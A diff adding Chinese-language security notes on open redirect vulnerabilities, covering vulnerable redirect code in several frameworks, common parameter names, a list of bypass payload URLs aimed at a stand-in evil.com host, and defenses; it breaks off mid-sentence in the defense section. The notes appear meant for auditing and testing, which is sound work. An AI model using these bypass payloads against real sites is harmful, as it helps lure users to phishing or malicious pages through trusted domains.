@@ -1,0 +1,132 @@
+URL跳转漏洞
+        
+    借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题，即黑客构建恶意链接(链接需要进行伪装,尽可能迷惑)，发在QQ群或者是浏览量多的贴吧/论坛中
+    对抗手法
+    	Referer限制，确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接
+    	加入有效性验证Token，保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制
+
+    漏洞场景
+    	URL跳转漏洞的出现场景还是很杂的，出现漏洞的原因主要有以下5个
+    		* 写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞
+    		* 写代码时考虑不周，用取子串、取后缀等方法简单判断，代码逻辑可被绕过
+    		* 对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过
+    		* 原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性，可被绕过
+    		* 原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过
+    	在没有分清楚具体场景时，一味的堆积姿势常常是费力不讨好
+    	总结完常见的漏洞场景，就可以根据总结情况，写个脚本，生成所有可能的payload，再放到工具(如burpsuite)里批量尝试，既省事，又不会人为遗漏
+    	由于不同语言对HTTP协议的实现和跳转函数的实现不一致，所以可能会出现对某种语言或框架特定的利用方式
+    	漏洞通常发生在以下几个地方
+    		* 用户登录、统一身份认证处，认证完后会跳转
+    		* 用户分享、收藏内容过后，会跳转
+    		* 跨站点认证、授权后，会跳转
+    		* 站内点击其它网址链接时，会跳转
+    	常见的参数名
+    		* redirect
+    		* redirect_to
+    		* redirect_url
+    		* url
+    		* jump
+    		* jump_to
+    		* target
+    		* to
+    		* link
+    		* linkto
+    		* domain
+    	几种语句和框架版本常见的URL跳转代码如下，可用作白盒代码审计参考
+    		* Java
+    			response.sendRedirect(request.getParameter("url"));
+    		* php
+    			$redirect_url = $_GET['url'];
+    			header("Location: " . $redirect_url);
+    		* .NET
+    			string redirect_url = request.QueryString["url"];
+    			Response.Redirect(redirect_url);
+    		* Django
+    			redirect_url = request.GET.get("url")
+    			HttpResponseRedirect(redirect_url)
+    		* Flask
+    			redirect_url = request.form['url']
+    			redirect(redirect_url)
+    		* Rails
+    			redirect_to params[:url]
+
+    利用方法
+    	后面假设源域名为：www.landgrey.me 要跳转过去的域为：evil.com
+
+    	直接跳转
+    		没做任何限制，参数后直接跟要跳转过去的网址就行
+    		https://www.landgrey.me/redirect.php?url=http://www.evil.com/untrust.html
+
+    	协议一致性
+    		当程序员校验跳转的网址协议必须为https时(有时候跳转不过去不会给提示)
+    		https://www.landgrey.me/redirect.php?url=https://www.evil.com/untrust.html
+
+    	域名字符串检测欺骗
+    		* 有的程序员会检测当前的域名字符串是否在要跳转过去的字符串中，是子字符串时才会跳转，php代码
+    			-----------------------------------------------------
+    			<?php
+    			$redirect_url = $_GET['url'];
+    			if(strstr($redirect_url,"www.landgrey.me") !== false)
+    			{
+    			    header("Location: " . $redirect_url);
+    			}
+    			else
+    			{
+    			    die("Forbidden");
+    			}
+    			-----------------------------------------------------
+    			绕过
+    				https://www.landgrey.me/redirect.php?
+    				url=http://www.landgrey.me.www.evil.com/untrust.html
+    		* 还有的会检测域名结尾是不是当前域名，是的话才会跳转，Django示例代码如下
+    			---------------------------------------------------
+    			redirect_url = request.GET.get("url")
+    			if redirect_url.endswith('landgrey.me'):
+    			    HttpResponseRedirect(redirect_url)
+    			else:
+    				HttpResponseRedirect("https://www.landgrey.me")
+    			---------------------------------------------------
+    			绕过
+    				https://www.landgrey.me/redirect.php?url=http://www.evil.com/www.landgrey.me
+    			买个xxxlandgrey.me域名，然后绕过
+    				https://www.landgrey.me/redirect.php?url=http://xxxlandgrey.me
+    		* 可信站多次重定向绕过
+    			利用已知可重定向到自己域名的可信站点的重定向，来最终重定向自己控制的站点
+    			一种是利用程序自己的公共白名单可信站点，如www.baidu.com，其中百度有个搜索的缓存链接比如https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG，可以最终跳转到自己网站，然后测试时
+    				https://www.landgrey.me/redirect.php?
+    				url=https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG
+    			就可以跳转到自己站点了
+    			另一种类似，但是程序的跳转白名单比较严格，只能是自己域的地址，这时需要有一个目标其它域的任意跳转漏洞，比如https://auth.landgrey.me/jump.do?url=evil.com，然后测试时
+    				https://www.landgrey.me/redirect.php?url=https://auth.landgrey.me/jump.do?url=evil.com
+    		* 畸形地址绕过
+    			这一部分由于各种语言、框架和代码实现的不同，防护任意跳转代码的多种多样，导致绕过方式乍看起来很诡异，有多诡异
+    			10种bypass方式
+    				* 单斜线"/"绕过
+    					https://www.landgrey.me/redirect.php?url=/www.evil.com
+    				* 缺少协议绕过
+    					https://www.landgrey.me/redirect.php?url=//www.evil.com
+    				* 多斜线"/"前缀绕过
+    					https://www.landgrey.me/redirect.php?url=///www.evil.com
+    					https://www.landgrey.me/redirect.php?url=www.evil.com
+    				* 利用"@"符号绕过
+    					https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com
+    				* 利用反斜线"\"绕过
+    					https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me
+    				* 利用"#"符号绕过
+    					https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me
+    				* 利用"?"号绕过
+    					https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me
+    				* 利用"\\"绕过
+    					https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me
+    				* 利用"."绕过
+    					https://www.landgrey.me/redirect.php?url=.evil(可能会跳转到www.landgrey.me.evil域名)
+    					https://www.landgrey.me/redirect.php?url=.evil.com(可能会跳转到evil.com域名)
+    				* 重复特殊字符绕过
+    					https://www.landgrey.me/redirect.php?url=///www.evil.com//..
+    					https://www.landgrey.me/redirect.php?url=www.evil.com//..
+
+    防御方法
+    	* 代码固定跳转地址，不让用户控制变量
+    	* 跳转目标地址采用白名单映射机制
+    		比如1代表auth.landgrey.me，2代表www.landgrey.me，其它不做任何动作
+    	* 合理充分的校验校验跳转的目标地址，非己方地址时告知用户跳转风
